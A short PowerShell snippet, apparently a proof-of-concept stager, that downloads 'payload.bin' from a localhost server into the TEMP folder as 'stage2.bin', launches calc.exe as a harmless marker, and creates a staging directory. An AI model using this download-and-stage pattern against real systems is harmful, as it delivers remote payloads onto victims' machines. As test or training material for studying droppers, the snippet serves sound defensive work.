
<# Stage transfer #> $Stage1Url = "http://localhost:8000/payload.bin"; $OutputPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($Stage1Url, $OutputPath); & "calc.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
